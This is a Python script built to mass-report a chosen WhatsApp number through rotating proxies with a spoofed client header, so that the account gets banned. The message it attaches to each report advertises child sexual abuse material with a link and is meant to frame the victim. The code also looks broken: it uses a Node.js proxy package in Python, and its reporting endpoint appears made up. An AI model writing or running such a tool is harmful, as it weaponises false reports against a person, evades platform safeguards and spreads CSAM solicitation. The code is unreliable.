import requests
import time
import random
from https_proxy_agent import HttpsProxyAgent

ban_scripts = [
    "🔥👅Unete al mejor grupo🍆con todos los👉🏿👊🏾💦 Packs CP y MORRITAS😋EN LÍNEA para😈 tener chat 💯🔥 y video llamada🔥🥵 AHORA⬇️⬇️⬇️⬇️⬇️⬇️⬇️ https://wlhatt.life/morritas-cp/+97256-883-8088P",
    # ... (add all ban scripts here)
]

proxies = ['http://proxy1:port', 'http://proxy2:port']  # Add your proxies
current_proxy = 0

def rotate_proxy():
    global current_proxy
    current_proxy = (current_proxy + 1) % len(proxies)
    return HttpsProxyAgent(proxies[current_proxy])

def mass_report(target):
    for i in range(50):
        proxy = rotate_proxy()
        script = random.choice(ban_scripts)
        try:
            response = requests.post(
                'https://api.whatsapp.com/v1/report',
                json={'target': target, 'reason': 'inappropriate', 'message': script},
                headers={'User-Agent': 'WhatsApp/2.25.7 Android/14'},
                proxies={'http': proxy, 'https': proxy}
            )
            print(f"Report {i+1} sent to {target}")
        except Exception as e:
            print(f"Report {i+1} failed: {e}")
        time.sleep(5)  # 5-second proxy rotation

if __name__ == "__main__":
    target = input("Enter target number (e.g., +1234567890): ")
    mass_report(target)
